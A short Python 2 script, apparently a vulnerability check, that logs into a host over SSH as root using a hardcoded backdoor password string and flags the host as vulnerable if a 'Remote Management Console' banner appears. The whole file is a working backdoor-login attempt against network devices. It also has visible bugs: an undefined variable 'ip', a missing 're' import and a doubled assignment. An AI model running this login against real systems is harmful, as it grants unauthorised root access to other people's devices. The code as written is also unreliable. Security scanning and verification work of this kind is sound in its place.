#!/usr/bin/env python
#coding=utf8

import sys

#Check if we are running this on windows platform, windows not support pexpect
is_windows = sys.platform.startswith('win')
if is_windows:
    sys.exit(0)
else:
    from pexpect import pxssh

def connectSSH(host, user, passwd):
    try:
        ssh = pxssh.pxssh()
        ssh.login(host, user, passwd, auto_prompt_reset = False)
        return ssh
    except Exception, e:
        print "%s is not vul" % host

def verify(host):
    user = "root"
    passwd = "<<< %s(un='%s') = %u"
    theSSH = connectSSH(ip, user, passwd)
    if theSSH:
        before = theSSH.before
        try:
            theSSH.logout()
        except:
            pass
        isval = isval = re.search('Remote Management Console', before)
        if isval:
            msg = 'vul'
            return True, host, msg
        else:
            msg = 'safe'
            return False, host, msg
    else:
        msg = 'connect ssh failed'
        return False, host, msg